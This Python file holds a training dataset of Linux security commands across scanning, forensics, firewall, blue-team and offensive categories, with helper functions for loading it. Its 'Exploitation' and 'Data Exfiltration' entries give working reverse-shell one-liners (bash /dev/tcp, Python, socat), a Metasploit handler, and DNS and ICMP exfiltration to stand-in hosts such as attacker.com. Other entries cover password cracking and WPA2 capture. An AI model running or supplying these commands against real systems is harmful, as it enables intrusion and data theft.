LINUX_COMMANDS_DATASET = [
    {"category": "Network Scanning", "instruction": "Scan network for live hosts", "response": "nmap -sn 192.168.1.0/24\nPing sweep to discover live hosts on a subnet.\n- -sn: ping scan (no port scan)\n- Output: list of live IPs and MAC addresses"},
    {"category": "Network Scanning", "instruction": "Scan open ports on a target", "response": "nmap -sS -sV -p- 10.0.0.1\nFull port scan with service detection.\n- -sS: SYN stealth scan\n- -sV: version detection\n- -p-: all 65535 ports"},
    {"category": "Network Scanning", "instruction": "Fast port scan top 100 ports", "response": "nmap -T4 -F 10.0.0.1\n- T4: aggressive timing\n- F: fast mode (top 100 ports)\n- Use -Pn if host blocks ping"},
    {"category": "Network Scanning", "instruction": "OS detection with nmap", "response": "nmap -O 10.0.0.1\n- -O: OS detection\n- Requires root privileges\n- Uses TCP/IP fingerprinting"},
    {"category": "Network Scanning", "instruction": "Scan with NSE vulnerability scripts", "response": "nmap -sV --script vuln 10.0.0.1\nRuns all vulnerability detection NSE scripts.\n- --script vuln: vulnerability checks\n- Also try: --script exploit, --script malware"},
    {"category": "Network Scanning", "instruction": "Discover services on network", "response": "nmap -sV -sC 10.0.0.0/24\n- -sV: version detection\n- -sC: default NSE scripts\n- Output: open ports, service names, versions"},
    {"category": "Network Scanning", "instruction": "Masscan - Ultra fast port scanner", "response": "masscan -p1-65535 --rate=10000 10.0.0.1\nScans all 65535 ports at 10k packets/sec.\n- Much faster than nmap\n- Use --rate to control speed"},
    {"category": "Traffic Capture", "instruction": "Capture live network traffic", "response": "tcpdump -i eth0 -nn -X\nReal-time packet capture.\n- -i eth0: interface\n- -nn: no name resolution\n- -X: hex+ASCII output"},
    {"category": "Traffic Capture", "instruction": "Capture HTTP traffic only", "response": "tcpdump -i eth0 -A 'tcp port 80'\n- -A: ASCII output\n- Filter: only HTTP traffic\n- Save with -w capture.pcap"},
    {"category": "Traffic Capture", "instruction": "Capture specific host traffic", "response": "tcpdump -i eth0 host 10.0.0.1\nCapture all traffic to/from a specific host.\n- src host: only source\n- dst host: only destination"},
    {"category": "Traffic Capture", "instruction": "tshark - Capture and analyze packets", "response": "tshark -i eth0 -Y 'http.request' -T fields -e http.host -e http.request.uri\nWireshark CLI. Capture HTTP requests.\n- -Y: display filter\n- -T fields: custom output"},
    {"category": "Traffic Capture", "instruction": "Capture packets to pcap file", "response": "tcpdump -i eth0 -w capture.pcap -s 65535\n- -w: write to file\n- -s: snaplen (full packets)\n- Analyze later: wireshark capture.pcap"},
    {"category": "Network Monitoring", "instruction": "Monitor live network connections", "response": "ss -tulpn\nModern replacement for netstat.\n- -t: TCP\n- -u: UDP\n- -l: listening\n- -p: process name\n- -n: numeric"},
    {"category": "Network Monitoring", "instruction": "Show active connections with netstat", "response": "netstat -antop\n- -a: all sockets\n- -n: numeric\n- -t: TCP\n- -o: timers\n- -p: PID"},
    {"category": "Network Monitoring", "instruction": "Monitor bandwidth per connection", "response": "iftop -i eth0 -n\nReal-time bandwidth monitoring.\n- -n: no DNS resolution\n- Shows top connections by bandwidth\n- Press L for bandwidth scale"},
    {"category": "Network Monitoring", "instruction": "Monitor bandwidth per process", "response": "nethogs eth0\nShows bandwidth usage per process.\n- Interactive: press m to change mode\n- Requires root"},
    {"category": "Network Monitoring", "instruction": "Continuous network stats", "response": "watch -n 1 'ss -tulpn'\nReal-time monitoring with 1s refresh.\n- watch: repeat command every N seconds\n- -d: highlight changes"},
    {"category": "DNS & Domain", "instruction": "DNS resolution lookup", "response": "dig example.com ANY +short\nDNS lookup for all record types.\n- ANY: all records\n- +short: concise output\n- Specific: dig example.com A"},
    {"category": "DNS & Domain", "instruction": "Reverse DNS lookup", "response": "dig -x 8.8.8.8 +short\nReverse DNS lookup for an IP address.\n- -x: reverse lookup\n- Returns hostname if PTR record exists"},
    {"category": "DNS & Domain", "instruction": "Traceroute to target", "response": "traceroute -n 8.8.8.8\nTrace network path to target.\n- -n: no DNS resolution\n- Shows each hop and latency"},
    {"category": "DNS & Domain", "instruction": "WHOIS domain lookup", "response": "whois example.com\nDomain registration information.\n- Registrar, creation date, expiry\n- Name servers, contacts\n- Install: apt install whois"},
    {"category": "DNS & Domain", "instruction": "DNS zone transfer check", "response": "dig @ns1.example.com example.com AXFR\nAttempt DNS zone transfer.\n- AXFR: zone transfer request\n- If misconfigured, dumps all DNS records"},
    {"category": "DNS & Domain", "instruction": "Subdomain enumeration", "response": "dnsrecon -d example.com\nDNS reconnaissance tool.\n- Enumerates subdomains\n- Checks zone transfer\n- SRV records"},
    {"category": "Log Analysis", "instruction": "Analyze failed SSH logins", "response": "grep 'Failed password' /var/log/auth.log | awk '{print $1, $2, $11}' | sort | uniq -c | sort -nr\nCount failed SSH attempts by IP.\n- awk: extract date and IP\n- sort | uniq -c: count per IP\n- sort -nr: numeric reverse sort"},
    {"category": "Log Analysis", "instruction": "Real-time SSH brute force monitor", "response": "tail -f /var/log/auth.log | awk '/Failed password/ {print $(NF-3)}' | sort | uniq -c\nReal-time monitoring of SSH attacks.\n- tail -f: follow new lines\n- awk: extract IP address"},
    {"category": "Log Analysis", "instruction": "Analyze web server access logs", "response": "awk '{print $1}' /var/log/nginx/access.log | sort | uniq -c | sort -nr | head -20\nTop IPs hitting web server.\n- $1: client IP\n- Top 20 IPs by request count"},
    {"category": "Log Analysis", "instruction": "Find suspicious log entries", "response": "journalctl -u ssh.service --since '24 hours ago' | grep -E 'Failed|Invalid|error'\nSearch systemd journal for SSH issues.\n- -u: unit (service)\n- --since: time filter\n- grep: filter patterns"},
    {"category": "Log Analysis", "instruction": "Monitor syslog for attacks", "response": "journalctl -f | grep -E 'attack|blocked|Failed|Invalid|error' -i\nReal-time monitoring of all system logs.\n- -f: follow (real-time)\n- -i: case insensitive"},
    {"category": "Log Analysis", "instruction": "Extract IPs from log files", "response": "grep -roh '\\b[0-9]\\{1,3\\}\\.[0-9]\\{1,3\\}\\.[0-9]\\{1,3\\}\\.[0-9]\\{1,3\\}\\b' /var/log/ | sort -u\nExtract all unique IP addresses from logs.\n- -r: recursive\n- -o: only matching\n- -h: no filename"},
    {"category": "Firewall", "instruction": "List iptables rules", "response": "iptables -L -n -v\nList all firewall rules.\n- -L: list rules\n- -n: numeric\n- -v: verbose (packet counts)"},
    {"category": "Firewall", "instruction": "Block an IP with iptables", "response": "iptables -A INPUT -s 10.0.0.1 -j DROP\nBlock all traffic from an IP.\n- -A INPUT: append to input chain\n- -s: source IP\n- -j DROP: drop packets"},
    {"category": "Firewall", "instruction": "Rate limit SSH connections", "response": "iptables -A INPUT -p tcp --dport 22 -m state --state NEW -m recent --set\niptables -A INPUT -p tcp --dport 22 -m state --state NEW -m recent --update --seconds 60 --hitcount 4 -j DROP\nRate limit SSH to 4 attempts/min."},
    {"category": "Firewall", "instruction": "Save iptables rules", "response": "iptables-save > /etc/iptables/rules.v4\nPersist iptables rules (Debian/Ubuntu).\n- Restore: iptables-restore < /etc/iptables/rules.v4"},
    {"category": "Firewall", "instruction": "UFW quick firewall setup", "response": "ufw default deny incoming\nufw default allow outgoing\nufw allow ssh\nufw allow 80/tcp\nufw allow 443/tcp\nufw enable\nufw status verbose\nQuick firewall with Uncomplicated Firewall."},
    {"category": "Firewall", "instruction": "nftables - Modern firewall", "response": "nft add table ip filter\nnft add chain ip filter input { type filter hook input priority 0; }\nnft add rule ip filter input tcp dport 22 accept\nnft add rule ip filter input drop\nModern replacement for iptables."},
    {"category": "Process Monitoring", "instruction": "List all running processes", "response": "ps aux --sort=-%cpu | head -20\nTop 20 processes by CPU usage.\n- aux: all users, detailed\n- --sort=-%cpu: sort by CPU descending\n- head -20: top 20"},
    {"category": "Process Monitoring", "instruction": "Find suspicious processes", "response": "ps aux | grep -E 'nc|ncat|perl|python|bash -i|/dev/tcp'\nFind potentially malicious processes.\n- Search for reverse shell patterns\n- Common backdoor tools"},
    {"category": "Process Monitoring", "instruction": "Show process network connections", "response": "lsof -i -P -n\nList all open network connections with PIDs.\n- -i: network files\n- -P: port numbers (no names)\n- -n: no hostnames"},
    {"category": "Process Monitoring", "instruction": "Find hidden processes", "response": "ps -e | grep -v \"$(cat /proc/version 2>/dev/null)\"\nDetect processes hiding via rootkits.\n- Compare process list against system info"},
    {"category": "Process Monitoring", "instruction": "Monitor process creation", "response": "auditctl -w /usr/bin/ -p wa -k binaries\nauditctl -a exit,always -S execve -k exec\nMonitor all process executions with auditd."},
    {"category": "File Integrity", "instruction": "Check file integrity with AIDE", "response": "aideinit\naide --check\nAdvanced Intrusion Detection Environment.\n- Initialize DB with aideinit\n- Check changes with aide --check"},
    {"category": "File Integrity", "instruction": "Find recently modified files", "response": "find /etc -type f -mmin -60 -exec ls -la {} \\;\nFind files modified in the last hour.\n- -mmin -60: modified within 60 minutes\n- /etc: system configs"},
    {"category": "File Integrity", "instruction": "Monitor file changes with inotify", "response": "inotifywait -m -r -e modify,create,delete /etc/\nReal-time file change monitoring.\n- -m: monitor continuously\n- -r: recursive\n- -e: events to watch"},
    {"category": "File Integrity", "instruction": "Find SUID binaries", "response": "find / -perm -4000 -type f 2>/dev/null\nFind all SUID binaries (privilege escalation risk).\n- -perm -4000: SUID bit set\n- 2>/dev/null: suppress errors"},
    {"category": "File Integrity", "instruction": "Check file hashes for changes", "response": "sha256sum /etc/passwd /etc/shadow /etc/hosts\nGenerate hashes to detect unauthorized changes.\n- Compare with known good hashes\n- Use in scripts for monitoring"},
    {"category": "Forensics", "instruction": "Analyze a suspicious binary", "response": "file suspicious.bin\nstrings suspicious.bin | grep -E 'http|https|socket|connect|exec'\nstrings suspicious.bin | head -50\nobjdump -d suspicious.bin | head -100\nBasic binary analysis workflow."},
    {"category": "Forensics", "instruction": "Extract strings from binary", "response": "strings -n 6 suspicious.bin | sort -u\nExtract all readable strings from a binary.\n- -n 6: minimum string length\n- Look for URLs, IPs, commands"},
    {"category": "Forensics", "instruction": "Check binary entropy", "response": "ent suspicious.bin\nMeasure file entropy (packed/encrypted).\n- High entropy (>7.5): likely packed\n- Low entropy: plain text/code"},
    {"category": "Forensics", "instruction": "Examine ELF binary headers", "response": "readelf -a suspicious.bin\nDetailed ELF header analysis.\n- Entry point, sections, symbols\n- Dynamic libraries (ldd)"},
    {"category": "Forensics", "instruction": "Memory dump analysis with volatility", "response": "volatility -f mem.dump imageinfo\nvolatility -f mem.dump --profile=Win7SP1x64 pslist\nvolatility -f mem.dump --profile=Win7SP1x64 netscan\nMemory forensics workflow."},
    {"category": "Forensics", "instruction": "Recover deleted files", "response": "testdisk /dev/sda\nphotorec /dev/sda1\nextundelete /dev/sda1 --restore-all\nforemost -t jpg,pdf -i /dev/sda1 -o /output\nFile recovery tools."},
    {"category": "Web Security", "instruction": "SQL injection test with sqlmap", "response": "sqlmap -u 'http://target.com/page?id=1' --batch --dbs\nsqlmap -u 'http://target.com/page?id=1' -D dbname --tables\nsqlmap -u 'http://target.com/page?id=1' -D dbname -T users --dump\nAutomated SQL injection testing."},
    {"category": "Web Security", "instruction": "Directory enumeration with gobuster", "response": "gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt -t 50\nDirectory/file brute forcing.\n- -u: target URL\n- -w: wordlist\n- -t: threads"},
    {"category": "Web Security", "instruction": "Directory enumeration with ffuf", "response": "ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt -c\nFast web fuzzer.\n- FUZZ: injection point\n- -c: color output\n- -fs: filter response size"},
    {"category": "Web Security", "instruction": "HTTP request with custom headers", "response": "curl -X GET 'http://target.com' -H 'User-Agent: Mozilla/5.0' -H 'Cookie: session=abc123' -v\ncURL with custom headers.\n- -X: HTTP method\n- -H: custom header\n- -v: verbose (response headers)"},
    {"category": "Web Security", "instruction": "POST data to web endpoint", "response": "curl -X POST 'http://target.com/login' -d 'user=admin&pass=test' -v\nHTTP POST request.\n- -d: form data\n- --data-binary @file: raw file"},
    {"category": "Web Security", "instruction": "Check HTTP headers for security issues", "response": "curl -sI 'http://target.com'\nCheck security headers.\n- Missing: Strict-Transport-Security, X-Frame-Options, Content-Security-Policy"},
    {"category": "Web Security", "instruction": "XSS testing payload", "response": "curl 'http://target.com/search?q=<script>alert(1)</script>'\nTest for reflected XSS vulnerabilities.\n- Check if script executes\n- Use polyglot payloads"},
    {"category": "Web Security", "instruction": "Test for open redirect", "response": "curl -v 'http://target.com/redirect?url=http://evil.com'\nCheck for open redirect vulnerabilities."},
    {"category": "Password Security", "instruction": "Audit user accounts", "response": "cat /etc/passwd | awk -F: '{print $1, $3, $7}' # Users, UID, shell\nawk -F: '($3 == 0) {print}' /etc/passwd # Find UID 0 users\nlast -10 # Recent logins\nlastb -10 # Failed logins"},
    {"category": "Password Security", "instruction": "Check password hashes", "response": "cat /etc/shadow | awk -F: '{print $1, $2}' # View hashes\nIdentify hash type:\n- $1$: MD5\n- $5$: SHA-256\n- $6$: SHA-512\n- $y$: yescrypt"},
    {"category": "Password Security", "instruction": "Crack hashes with hashcat", "response": "hashcat -m 0 -a 0 hashes.txt rockyou.txt # MD5 dictionary\nhashcat -m 1000 -a 3 hashes.txt ?a?a?a?a?a?a?a?a # NTLM brute\nhashcat -m 1800 -a 6 sha512crypt.txt wordlist.txt ?d?d"},
    {"category": "Password Security", "instruction": "John the Ripper password cracking", "response": "john --wordlist=rockyou.txt hashes.txt\njohn --show hashes.txt\nJohn the Ripper password cracker.\n- --incremental: brute force mode"},
    {"category": "Password Security", "instruction": "Hydra online password brute force", "response": "hydra -l admin -P passwords.txt ssh://10.0.0.1\nhydra -L users.txt -P passwords.txt ftp://10.0.0.1\nOnline password brute force."},
    {"category": "Exploitation", "instruction": "Metasploit - Search and use exploits", "response": "msfconsole\nmsf6 > search type:exploit platform:linux name:ssh\nmsf6 > use exploit/multi/handler\nmsf6 > set payload linux/x64/meterpreter/reverse_tcp\nmsf6 > set LHOST 10.0.0.1\nmsf6 > set LPORT 4444\nmsf6 > run"},
    {"category": "Exploitation", "instruction": "Netcat reverse shell listener", "response": "nc -lvnp 4444\nListen for reverse shells.\n- -l: listen\n- -v: verbose\n- -n: no DNS\n- -p: port"},
    {"category": "Exploitation", "instruction": "Netcat reverse shell (Linux target)", "response": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\nReverse shell payload.\n- bash -i: interactive shell\n- /dev/tcp: TCP connection\n- 0>&1: redirect stdin to socket"},
    {"category": "Exploitation", "instruction": "Python reverse shell", "response": "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"10.0.0.1\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'\nPython reverse shell one-liner."},
    {"category": "Exploitation", "instruction": "Socat reverse shell", "response": "# Attacker:\nsocat TCP-LISTEN:4444,reuseaddr -\n# Target:\nsocat TCP:10.0.0.1:4444 EXEC:/bin/sh\nMore reliable than netcat."},
    {"category": "Encryption", "instruction": "GPG symmetric encrypt file", "response": "gpg --symmetric --cipher-algo AES256 file.txt\nEncrypt file with password.\n- Output: file.txt.gpg\nDecrypt: gpg -d file.txt.gpg"},
    {"category": "Encryption", "instruction": "GPG asymmetric encrypt", "response": "gpg --encrypt --recipient user@email.com file.txt\ngpg --armor --encrypt --recipient user@email.com file.txt # ASCII armor\nEncrypt for specific recipient."},
    {"category": "Encryption", "instruction": "OpenSSL generate self-signed cert", "response": "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\nGenerate self-signed SSL certificate.\n- -x509: self-signed\n- -nodes: no password"},
    {"category": "Encryption", "instruction": "OpenSSL encrypt file", "response": "openssl enc -aes-256-cbc -salt -in file.txt -out file.enc\nopenssl enc -d -aes-256-cbc -in file.enc -out file.txt\nEncrypt/decrypt files with AES-256-CBC."},
    {"category": "Encryption", "instruction": "Check SSL certificate info", "response": "openssl x509 -in cert.pem -text -noout | head -30\nopenssl s_client -connect example.com:443 -showcerts\nCheck certificate details and chain."},
    {"category": "OSINT", "instruction": "Gather domain information", "response": "whois example.com\ndig example.com ANY +short\nhost -a example.com\nnslookup example.com\nComprehensive domain recon."},
    {"category": "OSINT", "instruction": "Email harvesting with theHarvester", "response": "theHarvester -d example.com -b google,linkedin,bing\nEmail and subdomain discovery.\n- -b: source (search engine)"},
    {"category": "OSINT", "instruction": "Certificate transparency search", "response": "curl -s 'https://crt.sh/?q=%25.example.com&output=json' | jq '.[].name_value' | sort -u\nFind subdomains via SSL cert transparency logs."},
    {"category": "OSINT", "instruction": "DNS brute force subdomains", "response": "for sub in $(cat subdomains.txt); do host $sub.example.com | grep 'has address' && echo $sub; done\nBash one-liner DNS brute force."},
    {"category": "Blue Team", "instruction": "Detect lateral movement", "response": "netstat -an | grep ESTABLISHED\nss -tulpn | grep -E ':(445|3389|5985|5986)'\nCheck for suspicious connections to admin ports."},
    {"category": "Blue Team", "instruction": "Check SSH authorized keys", "response": "cat ~/.ssh/authorized_keys\ncat /root/.ssh/authorized_keys 2>/dev/null\nfor user in $(ls /home/); do cat /home/$user/.ssh/authorized_keys 2>/dev/null; done\nCheck for unauthorized SSH keys."},
    {"category": "Blue Team", "instruction": "Check cron jobs for malware", "response": "crontab -l\nls -la /etc/cron*\ncat /etc/crontab\nfor user in $(cut -f1 -d: /etc/passwd); do crontab -u $user -l 2>/dev/null; done\nAudit all scheduled tasks."},
    {"category": "Blue Team", "instruction": "Check startup services", "response": "systemctl list-units --type=service --state=running\nservice --status-all 2>/dev/null\nls -la /etc/init.d/\nls -la /etc/systemd/system/\nCheck all running services."},
    {"category": "Blue Team", "instruction": "Fail2ban setup for SSH", "response": "# Install: apt install fail2ban\n# /etc/fail2ban/jail.local:\n# [sshd]\n# enabled = true\n# maxretry = 3\n# bantime = 3600\nsystemctl restart fail2ban\nfail2ban-client status sshd"},
    {"category": "WiFi Security", "instruction": "Capture WPA2 handshake", "response": "airmon-ng start wlan0\nairodump-ng wlan0mon\nairodump-ng -c <ch> --bssid <MAC> -w capture wlan0mon\naireplay-ng -0 5 -a <MAC> -c <client> wlan0mon\nCaptures WPA/WPA2 4-way handshake."},
    {"category": "WiFi Security", "instruction": "Crack WPA2 handshake", "response": "aircrack-ng -w wordlist.txt capture-01.cap\nhashcat -m 22000 capture.hccapx wordlist.txt\nCrack captured WPA2 handshakes."},
    {"category": "WiFi Security", "instruction": "Scan WiFi networks", "response": "iwlist wlan0 scan | grep -E 'ESSID|Channel|Quality|Encryption'\nScan for nearby WiFi networks."},
    {"category": "Container Security", "instruction": "List running containers", "response": "docker ps -a\ndocker stats --no-stream\nList all containers and their resource usage."},
    {"category": "Container Security", "instruction": "Inspect container for vulnerabilities", "response": "docker scan <image>\ntrivy image <image>\ngrype <image>\nContainer vulnerability scanning tools."},
    {"category": "Container Security", "instruction": "Check container escape vectors", "response": "capsh --print\ncat /proc/1/cgroup\nls -la /proc/1/ns/\nCheck if running inside a container and escape paths."},
    {"category": "System Hardening", "instruction": "Kernel security parameter check", "response": "sysctl -a | grep -E 'ip_forward|icmp_redirect|rp_filter|syn_cookies'\nCheck kernel security settings:\n- net.ipv4.ip_forward=0\n- net.ipv4.conf.all.rp_filter=1\n- net.ipv4.tcp_syncookies=1"},
    {"category": "System Hardening", "instruction": "Check SELinux/AppArmor status", "response": "getenforce # SELinux status\naastatus # AppArmor status\nCheck mandatory access control status."},
    {"category": "System Hardening", "instruction": "Check listening ports", "response": "ss -tulpn | grep LISTEN\nCheck all services listening on network ports.\n- Unexpected ports may indicate backdoors"},
    {"category": "System Hardening", "instruction": "Audit installed packages", "response": "apt list --installed 2>/dev/null | wc -l\nrpm -qa | wc -l\nCheck for outdated/unused packages:\napt list --upgradable 2>/dev/null"},
    {"category": "Data Exfiltration", "instruction": "Exfiltrate data via DNS", "response": "cat file.txt | while read line; do dig $(echo $line | base64 -w0).exfil.com +short; done\nCovert data exfiltration using DNS queries."},
    {"category": "Data Exfiltration", "instruction": "Exfiltrate via ICMP", "response": "ping -p $(xxd -p file.txt | head -c 56) attacker.com\nCovert data exfiltration using ICMP echo requests.\n- -p: payload (56 bytes max)"},
    {"category": "Privilege Escalation", "instruction": "Check sudo privileges", "response": "sudo -l\nCheck what commands can be run as sudo.\n- Look for exploitable entries:\n  (ALL) NOPASSWD: ALL\n  (ALL) /usr/bin/less, /usr/bin/vim"},
    {"category": "Privilege Escalation", "instruction": "Check for kernel exploits", "response": "uname -a\ncat /etc/*release\nls -la /proc/version\nCheck kernel version for known exploits.\n- Compare against exploit-db.com"},
    {"category": "Privilege Escalation", "instruction": "Check writable directories in PATH", "response": "for dir in $(echo $PATH | tr ':' ' '); do [ -w $dir ] && echo $dir; done\nFind writable directories in PATH for DLL/preload hijacking."},
    {"category": "Privilege Escalation", "instruction": "Check for credentials in config files", "response": "grep -r 'password' /etc/ --include='*.conf' --include='*.cfg' -l 2>/dev/null\ngrep -r 'password' /home/ --include='*.txt' --include='*.ini' -l 2>/dev/null\nFind hardcoded credentials in configs."},
]


def get_linux_training_data() -> list:
    return [
        {"instruction": item["instruction"], "response": item["response"], "category": item["category"]}
        for item in LINUX_COMMANDS_DATASET
    ]


def get_categories() -> list:
    return list(dict.fromkeys(item["category"] for item in LINUX_COMMANDS_DATASET))


def get_commands_by_category(category: str) -> list:
    return [item for item in LINUX_COMMANDS_DATASET if item["category"].lower() == category.lower()]


def get_command_count() -> int:
    return len(LINUX_COMMANDS_DATASET)


def get_category_count() -> int:
    return len(get_categories())
